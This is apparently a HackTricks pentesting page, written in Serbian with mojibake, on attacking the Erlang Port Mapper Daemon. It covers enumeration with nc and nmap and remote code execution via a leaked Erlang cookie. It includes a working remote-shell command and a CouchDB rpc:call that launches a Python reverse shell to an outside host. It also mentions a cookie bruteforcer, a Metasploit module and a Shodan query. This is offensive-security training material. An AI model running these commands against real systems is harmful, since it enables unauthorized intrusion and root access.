<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>


# Osnovne informacije

**Erlang Port Mapper Daemon (epmd)** sluÅ¾i kao koordinator za distribuirane Erlang instance. On je odgovoran za mapiranje simboliÄkih imena Ävorova na maÅ¡inske adrese, osiguravajuÄ‡i da je svako ime Ävora povezano sa odreÄ‘enom adresom. Ova uloga **epmd**-a je kljuÄna za besprekornu interakciju i komunikaciju izmeÄ‘u razliÄitih Erlang Ävorova preko mreÅ¾e.

**Podrazumevani port**: 4369
```
PORT     STATE SERVICE VERSION
4369/tcp open  epmd    Erlang Port Mapper Daemon
```
Ovo se podrazumevano koristi na instalacijama RabbitMQ i CouchDB.

# Enumeracija

## RuÄno
```bash
echo -n -e "\x00\x01\x6e" | nc -vn <IP> 4369

#Via Erlang, Download package from here: https://www.erlang-solutions.com/resources/download.html
dpkg -i esl-erlang_23.0-1~ubuntu~xenial_amd64.deb
apt-get install erlang
erl #Once Erlang is installed this will promp an erlang terminal
1> net_adm:names('<HOST>'). #This will return the listen addresses
```
## Automatsko

Automatsko otkrivanje Erlang Port Mapper Daemon (EPMD) moÅ¾e biti korisno prilikom pentestiranja mreÅ¾nih usluga. EPMD je servis koji se koristi za upravljanje i mapiranje Erlang procesa na mreÅ¾i. Ovaj servis je zaduÅ¾en za registraciju Erlang Ävorova i omoguÄ‡ava komunikaciju izmeÄ‘u njih.

Da biste automatski otkrili EPMD, moÅ¾ete koristiti alat poput Nmap-a. Nmap je popularan alat za skeniranje mreÅ¾e koji moÅ¾e otkriti otvorene portove i identifikovati servise koji rade na tim portovima.

Kada koristite Nmap za otkrivanje EPMD-a, moÅ¾ete koristiti sledeÄ‡u komandu:

```
nmap -p 4369 <cilj>
```

Ova komanda Ä‡e skenirati ciljni sistem i proveriti da li je port 4369 otvoren. Ako je port otvoren, to ukazuje na to da je EPMD aktivan na ciljnom sistemu.

Nakon Å¡to otkrijete EPMD, moÅ¾ete iskoristiti razliÄite tehnike za dalje pentestiranje. Na primer, moÅ¾ete pokuÅ¡ati da izvrÅ¡ite napad poput Erlang Distribution Protocol (EPMD) leak-a, koji omoguÄ‡ava napadaÄu da dobije informacije o Erlang Ävorovima na mreÅ¾i.

VaÅ¾no je napomenuti da je pentestiranje mreÅ¾nih usluga legalno samo ako imate dozvolu vlasnika sistema. Uvek se pridrÅ¾avajte etiÄkih smernica i zakona prilikom izvoÄ‘enja bilo kakvih pentestiranja.
```bash
nmap -sV -Pn -n -T4 -p 4369 --script epmd-info <IP>

PORT     STATE SERVICE VERSION
4369/tcp open  epmd    Erlang Port Mapper Daemon
| epmd-info:
|   epmd_port: 4369
|   nodes:
|     bigcouch: 11502
|     freeswitch: 8031
|     ecallmgr: 11501
|     kazoo_apps: 11500
|_    kazoo-rabbitmq: 25672
```
# Erlang Cookie RCE

## Udaljena veza

Ako moÅ¾ete **procuriti autentifikacijski kolaÄiÄ‡**, moÄ‡i Ä‡ete izvrÅ¡iti kod na hostu. ObiÄno se ovaj kolaÄiÄ‡ nalazi u `~/.erlang.cookie` i generiÅ¡e ga Erlang prilikom prvog pokretanja. Ako nije izmenjen ili postavljen ruÄno, to je nasumiÄan niz \[A:Z\] duÅ¾ine 20 karaktera.
```bash
greif@baldr ~$ erl -cookie YOURLEAKEDCOOKIE -name test2 -remsh test@target.fqdn
Erlang/OTP 19 [erts-8.1] [source] [64-bit] [async-threads:10]

Eshell V8.1 (abort with ^G)

At last, we can start an erlang shell on the remote system.

(test@target.fqdn)1>os:cmd("id").
"uid=0(root) gid=0(root) groups=0(root)\n"
```
ViÅ¡e informacija na [https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/](https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/)\
Autor takoÄ‘e deli program za bruteforceovanje kolaÄiÄ‡a:

{% file src="../.gitbook/assets/epmd_bf-0.1.tar.bz2" %}

## Lokalna veza

U ovom sluÄaju Ä‡emo zloupotrebiti CouchDB da bismo lokalno poveÄ‡ali privilegije:
```bash
HOME=/ erl -sname anonymous -setcookie YOURLEAKEDCOOKIE
(anonymous@canape)1> rpc:call('couchdb@localhost', os, cmd, [whoami]).
"homer\n"
(anonymous@canape)4> rpc:call('couchdb@localhost', os, cmd, ["python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.9\", 9005));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"]).
```
Primer preuzet sa [https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution](https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution)\
MoÅ¾ete koristiti **Canape HTB maÅ¡inu** da biste **veÅ¾bali** kako da **iskoristite ovu ranjivost**.

## Metasploit
```bash
#Metasploit can also exploit this if you know the cookie
msf5> use exploit/multi/misc/erlang_cookie_rce
```
# Shodan

* `port:4369 "na portu"`


<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
